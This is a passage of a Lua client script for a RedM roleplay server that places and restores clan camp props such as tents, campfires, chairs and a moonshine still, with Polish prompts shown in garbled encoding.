                        end

                    end
                elseif tentslotno == 6 then
                    local tenttype = GetHashKey("p_campfire02x")
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Budowanie ogniska...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.fire..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end 
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 7 then
                    local tenttype = GetHashKey("p_hitchingpost01x")
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie SĹ‚upka Zaczepowego...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.post..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 8 then
                    local tenttype = GetHashKey("p_hitchingpost01x")
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie SĹ‚upka Zaczepowego...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.post..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 9 then
                    local tenttype = 1677892762
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Tworzenie StoĹ‚u...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.table..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 10 then
                    local tenttype = -576101586
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Tworzenie Ekwipunku...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.invent..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 11 then
                    local tenttype = 174418135
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Gotowanie Gulaszu...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.stew..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 12 then
                    local tenttype = 325252933
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.2, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

        
                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.chair..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 13 then
                    local tenttype = 325252933
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.2, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.chair..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 14 then
                    local tenttype = 325252933
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.2, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.chair..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 15 then
                    local tenttype = 325252933
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.2, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.chair..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 16 then
                    local tenttype = 325252933
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz KrzesĹ‚o...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -0.2, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.chair..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 17 then
                    local tenttype = GetHashKey("p_boxcar_barrel_09a")
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Stawianie Beczki Moonshine...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.Barrel..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 18 then
                    local tenttype = GetHashKey("mp001_p_mp_still02x")
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Robisz Destylator do Moonshine...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z+0.5, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.Destiller..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                elseif tentslotno == 19 then
                    local tenttype = 1089195187
                    
                    if whenKeyJustPressed(Config.keys.three) then
                        camplocation2 = 0
                    
                    local betweencoords = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, tables.x, tables.y, tables.z, false)
        
                    if betweencoords < 40 then
                        
                            TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_CROUCH_INSPECT'), 30000, true, false, false, false)
                            exports['progressBars']:startUI(10000, "Budowa SprzÄ™tu RzeĹşniczego...")
                            Citizen.Wait(10000)
                            ClearPedTasks(PlayerPedId())
        
                            local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, -1.55))
        
                            local heading = GetEntityHeading(PlayerPedId())
                            local tent1 = CreateObject(tenttype, x, y, z, true, false, true)
                            SetEntityHeading(tent1, heading)
                            PlaceObjectOnGroundProperly(tent1)
                            SetEntityAsMissionEntity(tent1)
                            FreezeEntityPosition( tent1, true)

                            local tent = {x=x, y=y, z=z, h=heading, m=tenttype}
                            TriggerServerEvent("syn:savetent", tent, tentslotno, clanid2)
                            TriggerServerEvent("syn:cashledger", total, clanid2)
                            if web == 0 then
                            else
                                local msg = Config.webhookLanguage.boughtbutcher..cost..Config.webhookLanguage.currentbalance..total..Config.webhookLanguage.currency
                                TriggerServerEvent('syn:log', web,  msg, clanname)
                            end
                            TriggerServerEvent('syn:getclan')
                            TriggerServerEvent("syn:getclanid")
                            Citizen.Wait(1000)
                            TriggerServerEvent("syn:getcamp",clanid2) 
                        else
                            TriggerEvent("syn:warndistance")

                        end
                    end
                

                    --
                end
        end   
        if sleep then 
            Citizen.Wait(1000)
        end

    end
end)


RegisterNetEvent("syn:createtent")
AddEventHandler("syn:createtent", function(campsloco)
    local _source = source
    camplocation2 = campsloco
    TriggerEvent("vorp:TipBottom", 'WciĹ›nij [G], by zbudowaÄ‡ (nie idĹş za daleko max 40 jednostek!)', 8000)

end)

RegisterNetEvent("syn:moveeqipment")
AddEventHandler("syn:moveeqipment", function(campsloco)
    local _source = source
    campspot = campsloco
    TriggerEvent("vorp:TipBottom", 'WciĹ›nij [G], by zbudowaÄ‡ (nie idĹş za daleko max 40 jednostek!)', 8000)

end)

RegisterNetEvent("syn:upgradeequip")
AddEventHandler("syn:upgradeequip", function(campsloco)
    local _source = source
    upgradespot = campsloco
    TriggerEvent("vorp:TipBottom", 'WciĹ›nij [G], by zbudowaÄ‡ (nie idĹş za daleko max 40 jednostek!)', 8000)

end)

RegisterNetEvent("syn:warndistance")
AddEventHandler("syn:warndistance", function()
    local _source = source
    TriggerEvent("vorp:TipBottom", 'You are too far', 4000)

end)

RegisterNetEvent("syn:warndistance2")
AddEventHandler("syn:warndistance2", function()
    local _source = source
    TriggerEvent("vorp:TipBottom", 'KtoĹ› jest za blisko ciebie', 4000)

end)


RegisterNetEvent("syn:restcamp")
AddEventHandler("syn:restcamp", function()
    local _source = source
    TriggerEvent("vorp:TipBottom", 'Odpoczywasz', 4000)
    TaskStartScenarioInPlace(PlayerPedId(), GetHashKey('WORLD_HUMAN_SLEEP_GROUND_PILLOW'), 30000, true, false, false, false)
    Citizen.Wait(30000)
    local closestPlayerPed = GetPlayerPed(closestPlayer)
            local health = GetAttributeCoreValue(closestPlayerPed, 0) 
            local newHealth = health + 100
            local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
            local newStamina = stamina + 100
            local health2 = GetEntityHealth(closestPlayerPed)
            Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
            Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
    ClearPedTasks(PlayerPedId())

end)


RegisterNetEvent("syn:refreshcamp") -- refresh camp event addprop
AddEventHandler("syn:refreshcamp", function( campsloco, firsttent, secondtent, thirdtent, fourthtent,
    fifthtent, fire, hitch1, hitch2, table, 
   inventory, chair1, chair2, chair3, chair4, chair5, barrel, destiller,stew, tanner)
    local _source = source
    if campsloco ==0 then
    else
            local comp = json.decode(campsloco)

            local object = GetClosestObjectOfType(comp.x, comp.y, comp.z, 1.5, -229587575, 0)
                SetEntityAsMissionEntity(object)
                DeleteObject(object)
                local campflags = CreateObject(-229587575, comp.x, comp.y, comp.z, true, false, true)
                        SetEntityHeading(campflags, comp.h)
                        PlaceObjectOnGroundProperly(campflags)
                        SetEntityAsMissionEntity(campflags)   
                        FreezeEntityPosition( campflags, true)


                if firsttent == 0 then  
                else
                    local tent1x = json.decode(firsttent)

                        local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(tent1x.m, tent1x.x, tent1x.y, tent1x.z, true, false, true)
                            SetEntityHeading(tent1s, tent1x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
 
                    
                end

                if secondtent == 0 then  
                else
                    local tent2x = json.decode(secondtent)

                        local object1 = GetClosestObjectOfType(tent2x.x, tent2x.y, tent2x.z, 2.5, tent2x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(tent2x.m, tent2x.x, tent2x.y, tent2x.z, true, false, true)
                            SetEntityHeading(tent1s, tent2x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)

                    
                end

                if thirdtent == 0 then  
                else
                    local tent3x = json.decode(thirdtent)

                        local object1 = GetClosestObjectOfType(tent3x.x, tent3x.y, tent3x.z, 2.5, tent3x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(tent3x.m, tent3x.x, tent3x.y, tent3x.z, true, false, true)
                            SetEntityHeading(tent1s, tent3x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
 
                    
                end

                if fourthtent == 0 then  
                else
                    local tent4x = json.decode(fourthtent)

                        local object1 = GetClosestObjectOfType(tent4x.x, tent4x.y, tent4x.z, 2.5, tent4x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(tent4x.m, tent4x.x, tent4x.y, tent4x.z, true, false, true)
                            SetEntityHeading(tent1s, tent4x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)

                    
                end

                if fifthtent == 0 then  
                else
                    local tent5x = json.decode(fifthtent)

                        local object1 = GetClosestObjectOfType(tent5x.x, tent5x.y, tent5x.z, 2.5, tent5x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(tent5x.m, tent5x.x, tent5x.y, tent5x.z, true, false, true)
                            SetEntityHeading(tent1s, tent5x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)

                    
                end
                if fire == 0 then  
                else
                    local firex = json.decode(fire)

                        local object1 = GetClosestObjectOfType(firex.x, firex.y, firex.z, 2.5, firex.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(firex.m, firex.x, firex.y, firex.z, true, false, true)
                            SetEntityHeading(tent1s, firex.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)

                end
                if stew == 0 then  
                else
                    local stewx = json.decode(stew)

                        local object1 = GetClosestObjectOfType(stewx.x, stewx.y, stewx.z, 2.5, stewx.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                    -- Citizen.Wait(2000)
                        local tent1s = CreateObject(stewx.m, stewx.x, stewx.y, stewx.z, true, false, true)
                            SetEntityHeading(tent1s, stewx.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)

                end
                if hitch1 == 0 then  
                else
                    local hitch1x = json.decode(hitch1)--

                    local object1 = GetClosestObjectOfType(hitch1x.x, hitch1x.y, hitch1x.z, 2.5, hitch1x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(hitch1x.m, hitch1x.x, hitch1x.y, hitch1x.z, true, false, true)
                            SetEntityHeading(tent1s, hitch1x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)   
                            FreezeEntityPosition( tent1s, true)

